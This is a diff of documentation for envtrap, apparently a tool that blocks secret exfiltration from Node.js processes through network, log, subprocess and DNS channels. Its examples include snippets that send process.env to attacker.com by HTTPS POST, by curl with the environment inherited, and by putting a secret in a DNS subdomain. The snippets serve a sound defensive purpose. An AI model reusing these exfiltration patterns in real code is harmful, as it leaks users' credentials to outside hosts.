@@ -1,129 +1,159 @@
 ---
 title: "Attack Surfaces"
-description: "The five runtime attack surfaces envtrap monitors and blocks to prevent secret exfiltration."
+description: "The five runtime channels envtrap monitors to prevent secret exfiltration from Node.js processes."
 ---
 
 ## Overview
 
-envtrap protects against **five distinct exfiltration attack surfaces** that are commonly exploited by malicious npm packages and compromised dependencies:
+envtrap protects against five distinct exfiltration paths that malicious packages commonly exploit:
 
 <CardGroup cols={2}>
-  <Card title="HTTPS Traffic" icon="globe">
-    Outbound HTTP/S requests carrying secrets in headers or body
+  <Card title="Network (HTTPS/HTTP)" icon="globe">
+    Outbound requests carrying secrets in headers, body, or URL
   </Card>
   <Card title="stdout / stderr" icon="terminal">
-    Secrets written to console output and log streams
+    Console output and log streams leaking secrets
   </Card>
-  <Card title="Subprocesses" icon="code-branch">
-    Unauthorized child processes (curl, wget, nc) spawned to exfiltrate data
+  <Card title="child_process" icon="code-branch">
+    Spawned subprocesses inheriting secrets via `options.env`
   </Card>
-  <Card title="DNS Tunneling" icon="network-wired">
-    Data encoded in DNS subdomain queries to bypass HTTP monitoring
+  <Card title="DNS" icon="network-wired">
+    Secrets encoded in DNS subdomain queries to bypass HTTP monitoring
   </Card>
   <Card title="Entropy Detection" icon="chart-bar">
-    Statistical detection of high-entropy strings in all channels
+    Statistical screening of high-entropy strings in `process.env` and `.env`
   </Card>
 </CardGroup>
 
 ---
 
-## 1. HTTPS Traffic
+## 1. Network Channel (`network`)
 
-**Why it's a risk**: Almost all npm packages make outbound HTTPS calls for telemetry, updates, or their core functionality. A malicious package simply sends your `process.env` to an attacker server using `https.request`.
+**Risk**: Any npm package can make outbound HTTPS requests and silently include secrets in headers or the request body. Standard firewalls only filter by IP/domain — they cannot inspect encrypted TLS payloads.
 
 **What envtrap does**:
-- Intercepts every `https.request` and `http.request` call
-- Inspects request URL, headers, and body
-- Checks against domain allow-list
-- Scans body for secret patterns
+- Starts a local MITM TLS proxy on `127.0.0.1`
+- Routes all HTTP/HTTPS traffic from the child process through it via `HTTP_PROXY` / `HTTPS_PROXY`
+- Decrypts TLS connections using an in-memory CA (the child trusts it via `NODE_EXTRA_CA_CERTS`)
+- Scans the decrypted **URL path**, **request headers**, and **request body** for loaded secrets
+- **`block` mode**: Responds with `403 Forbidden` (HTTP) or destroys the socket (HTTPS CONNECT)
+- **`warn` mode**: Logs the leak and forwards the request to the real upstream server
+
+**Domain exclusions**: Add trusted domains to `exclusions.domains` to bypass proxy scanning for known-safe traffic:
+
+```json
+{ "exclusions": { "domains": ["api.stripe.com", "api.openai.com"] } }
+```
 
 **Example attack blocked**:
 ```javascript
-// Malicious code inside node_modules/evil-package/index.js
+// inside node_modules/evil-package/index.js
 const https = require('https');
 https.request({
   hostname: 'attacker.com',
   path: '/collect',
   method: 'POST',
-  body: JSON.stringify(process.env)  // All your secrets!
-});
+}).end(JSON.stringify(process.env)); // All secrets sent!
 ```
 
 ```
-BLOCKED | Channel: HTTPS | Secret: STRIPE_SECRET_KEY
-Destination: attacker.com | Action: Request terminated
+🌐 SECRET LEAK DETECTED
+  Secret:  STRIPE_SECRET_KEY  (source: env)
+  Channel: 🌐  NETWORK
+  Context:
+    Outbound HTTPS Request Audited:
+    Destination Host: attacker.com
+    Request Line: POST /collect
 ```
 
 ---
 
-## 2. stdout / stderr
+## 2. stdout / stderr Channels (`stdout`, `stderr`)
 
-**Why it's a risk**: Logging libraries, debug statements, and error handlers frequently serialize the full environment or request objects — leaking secrets into log streams that may be stored or transmitted.
+**Risk**: Logging frameworks, debug utilities, and error handlers frequently serialize full request objects or environment maps — leaking secrets into log streams that may be stored, shipped to log aggregators, or captured by AI coding tools.
 
 **What envtrap does**:
-- Wraps `process.stdout.write` and `process.stderr.write`
-- Scans each write for secret patterns before output
-- Redacts matched values: `[REDACTED:ENVTRAP]`
+- Pipes the child process's `stdout` and `stderr` streams to the parent envtrap process
+- Scans every chunk for active secret values
+- **Redacts** matched secrets: `[REDACTED: SHA256:<8-char hash>]`
+- **`block` mode**: Sends `SIGTERM` to the child process immediately after the first detection
+- **`warn` mode**: Redacts the output and logs the leak, child continues running
+
+**Path exclusions**: If the code writing to stdout/stderr originates from a path matching `exclusions.paths`, the hook pre-redacts the content to `[REDACTED: PATH_EXCLUDED]` **inside the child process** before it reaches the parent scanner, suppressing the alert entirely.
 
 **Example**:
 ```javascript
-console.log('Request failed:', { headers, body });
-// headers.Authorization = "Bearer sk_live_..."
-// → stdout gets: "Bearer [REDACTED:ENVTRAP]"
+console.log('Request config:', { headers: { Authorization: `Bearer ${process.env.GITHUB_TOKEN}` } });
+// → stdout gets: "Bearer [REDACTED: SHA256:f23831a9]"
 ```
 
 ---
 
-## 3. Subprocesses (`child_process`)
+## 3. child_process Channel (`child_process`)
 
-**Why it's a risk**: Spawning child processes (like calling shell utilities or native scripts) passing environment variables that carry active secrets is a major exfiltration risk. A malicious npm script can spawn `curl` or `wget` passing the full environment block.
+**Risk**: `child_process.exec` and `spawn` can be called with an explicit `options.env` object. Malicious code can pass the full process environment (containing all secrets) to shell utilities like `curl`, `wget`, or `python` to exfiltrate data.
 
 **What envtrap does**:
-- Hooks `exec`, `execSync`, `spawn`, `spawnSync`, `fork`, `execFile`, and `execFileSync`.
-- Inspects the environment object (`options.env`) being sent to the subprocess.
-- Blocks execution or throws an error in `"block"` mode if active secrets are being inherited.
+- Wraps `spawn`, `spawnSync`, `exec`, `execSync`, `execFile`, `execFileSync`, and `fork`
+- Checks if `options.env` contains any active secret value by exact key match
+- Works for **both ESM (`import`)** and **CommonJS (`require()`)** — via module.register() hooks and Module.prototype.require patching respectively
+- **`block` mode**: Throws a synchronous `Error` before any OS fork happens
+- **`warn` mode**: Reports the leak to the parent via stderr, subprocess execution continues
 
-**Configuration**:
-```json
-{
-  "channels": {
-    "child_process": "block"
-  }
-}
+**Path exclusions**: If the spawn call originates from a file matching `exclusions.paths`, the check is skipped entirely.
+
+**Example attack blocked**:
+```javascript
+const { exec } = require('child_process');
+exec('curl https://attacker.com', {
+  env: { ...process.env }  // includes STRIPE_SECRET_KEY!
+});
+// → Throws: [envtrap] child_process block: env key "STRIPE_SECRET_KEY" passed to child process
 ```
 
 ---
 
-## 4. DNS Tunneling (`dns`)
+## 4. DNS Channel (`dns`)
 
-**Why it's a risk**: DNS queries bypass most HTTP firewalls. Malicious packages can encode secrets inside subdomain queries (e.g., `c3RyaXBlX3NlY3JldA==.attacker.com`) to leak them via local DNS resolvers.
+**Risk**: DNS lookups bypass most HTTP-layer firewalls. Attackers can encode secrets in subdomain labels (e.g., `c3RyaXBlX3NlY3JldA==.attacker.com`) and recover them server-side from DNS query logs — without making a single HTTP connection.
 
 **What envtrap does**:
-- Intercepts all name resolution calls in `node:dns`.
-- Blocks resolutions containing active secrets.
-- Scans labels (segments) of the requested hostname using Shannon entropy to identify high-entropy strings (e.g. base64-encoded strings).
+- Intercepts **all `node:dns` API calls**: `lookup`, `resolve`, `resolve4`, `resolve6`, `resolveAny`, `resolveCname`, `resolveMx`, `resolveNaptr`, `resolveNs`, `resolvePtr`, `resolveSoa`, `resolveSrv`, `resolveTxt`, and all `dns.promises.*` equivalents
+- Checks the target hostname for **exact matches** of any registered secret value
+- Performs **high-entropy subdomain analysis**: splits the hostname on `.`, checks each label — if a label has length ≥ `entropy.minLength` AND Shannon entropy ≥ `entropy.threshold`, a tunneling warning is emitted regardless of whether a secret was matched
+- Works for both **ESM and CommonJS**
+- **`block` mode**: Throws a synchronous `Error` before any network packet is sent
+- **`warn` mode**: Emits the warning and allows the lookup to proceed
 
-**Heuristics**:
-* Any domain query matching an active secret is blocked or logged.
-* Any subdomain label with a length >= configured min length (default: `12`) and entropy >= configured threshold (default: `3.5`) triggers a DNS exfiltration warning.
+**Example attack blocked**:
+```javascript
+import dns from 'dns';
+// Secret value embedded in subdomain:
+dns.lookup(`${process.env.STRIPE_SECRET_KEY}.attacker.com`, () => {});
+// → Throws: DNS resolution blocked by envtrap: potential secret leak detected in domain name
+```
 
 ---
 
-## 5. Entropy Detection
+## 5. Entropy Detection (Secret Candidate Screening)
 
-**Why it's a risk**: Custom credentials, tokens, or encryption keys that are randomly generated might not match built-in regex patterns, but still need protection from exfiltration.
+**Risk**: Randomly generated API tokens, encryption keys, and internal credentials may not match any known regex pattern, but they are just as sensitive.
 
 **What envtrap does**:
-- Screens your `process.env` and `.env` files on startup for any values passing the entropy/length gates.
-- Adds qualifying high-entropy strings to the active secret pool, protecting them across all active channels.
+- At startup, screens every `process.env` value and `.env` file entry through a **Shannon entropy gate**
+- Values with entropy ≥ `entropy.threshold` (default: `3.5`) AND length ≥ `entropy.minLength` (default: `12`) are registered as active secrets
+- Once registered, they are protected across **all five channels** exactly like pattern-matched secrets
+
+This means even a custom 24-character random token without a known format will be detected if it leaks through network traffic, logs, or DNS.
 
 ---
 
-## Attack Surface Matrix
+## Channel Summary
 
-| Attack Surface | Mode Option | Domain Exclusions | Path Exclusions |
-|---|---|---|---|
-| HTTPS / HTTP | `network` | ✅ | — |
-| stdout / stderr | `stdout` / `stderr` | — | ✅ |
-| Subprocess environment | `child_process` | — | ✅ |
-| DNS queries | `dns` | — | ✅ |
+| Channel | Key in config | Default Mode | ESM Support | CJS Support | Path Exclusions |
+|---|---|---|---|---|---|
+| Outbound HTTP/HTTPS | `network` | `block` | ✅ (via proxy) | ✅ (via proxy) | ❌ |
+| Standard Output | `stdout` | `warn` | ✅ | ✅ | ✅ |
+| Standard Error | `stderr` | `warn` | ✅ | ✅ | ✅ |
+| Subprocess env | `child_process` | `warn` | ✅ | ✅ | ✅ |
+| DNS resolution | `dns` | `block` | ✅ | ✅ | ✅ |
